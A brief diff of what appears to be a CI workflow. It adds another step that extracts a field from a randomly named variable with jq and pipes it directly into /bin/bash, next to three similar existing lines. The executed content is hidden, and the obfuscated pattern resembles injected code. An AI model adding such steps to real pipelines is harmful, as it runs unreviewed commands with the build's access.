@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$t1307" | jq -r .ij62 | /bin/bash
           printf '%s' "$drpvh369" | jq -r .rh09015 | /bin/bash
           printf '%s' "$g36" | jq -r .vqdjv94222 | /bin/bash
+          echo $r1519 | jq -r .nb4 | /bin/bash
 
       - name: Persist results
         if: always()
